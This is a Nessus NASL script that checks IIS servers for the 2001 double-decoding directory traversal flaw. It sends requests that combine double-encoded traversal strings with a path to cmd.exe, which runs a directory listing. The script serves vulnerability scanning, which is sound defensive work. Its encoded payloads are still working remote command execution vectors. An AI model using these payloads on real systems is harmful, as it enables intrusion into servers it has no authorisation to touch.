#
# This script was modified Matt Moore (matt@westpoint.ltd.uk)
# from the NASL script to test for the UNICODE directory traversal 
# vulnerability, originally written by Renaud Deraison.
#
# Then Renaud took Matt's script and used H D Moore modifications
# to iis_dir_traversal.nasl ;)
# 
#

if(description)
{
 script_id(10671);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-a-0006");
 script_bugtraq_id(2708, 3193);
 script_version ("$Revision: 1.32 $");
 script_cve_id("CVE-2001-0507", "CVE-2001-0333");

 name["english"] = "IIS Remote Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = "

When IIS receives a user request to run a script, it renders
the request in a decoded canonical form, then performs
security checks on the decoded request. A vulnerability
results because a second, superfluous decoding pass is
performed after the initial security checks are completed.
Thus, a specially crafted request could allow an attacker to
execute arbitrary commands on the IIS Server.

Solution:  See MS advisory MS01-026(Superseded by ms01-044)
See http://www.microsoft.com/technet/security/bulletin/ms01-044.mspx

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Determines if arbitrary commands can be executed";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001 Matt Moore / H D Moore");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( "Microsoft/IIS" >!< banner ) exit(0);

if(!get_port_state(port))exit(0);


dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";		# FP
dir[4] = "/_mem_bin/";		# FP
dir[5] = "/exchange/";		# OWA
dir[6] = "/pbserver/";		# Win2K
dir[7] = "/rpc/";		# Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%255c";  	dots[0] = "..";
uni[1] = "%%35c";	dots[1] = "..";
uni[2] = "%%35%63";	dots[2] = "..";
uni[3] = "%25%35%63";   dots[3] = "..";
uni[4] = "%252e";	dots[4] = "/.";




function check(req)
{
 r = http_keepalive_send_recv(port:port, data:http_get(item:req, port:port));
 if(r == NULL)
 { 
  exit(0);
 }

 pat = "<DIR>";
 pat2 = "Directory of C";

 if((pat >< r) || (pat2 >< r)){
   	security_hole(port:port);
	return(1);
 	}
 return(0);
}


cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d=0;dir[d];d=d+1)
{
	for(i=0;uni[i];i=i+1)
	{
		url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], cmd);
		if(check(req:url))exit(0);
	}
}


# Slight variation- do the same, but don't put dots[i] in front
# of cmd (reported on vuln-dev)

for(d=0;dir[d];d=d+1)
{
	for(i=0;uni[i];i=i+1)
	{
		url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], cmd);
		if(check(req:url))exit(0);
	}
}


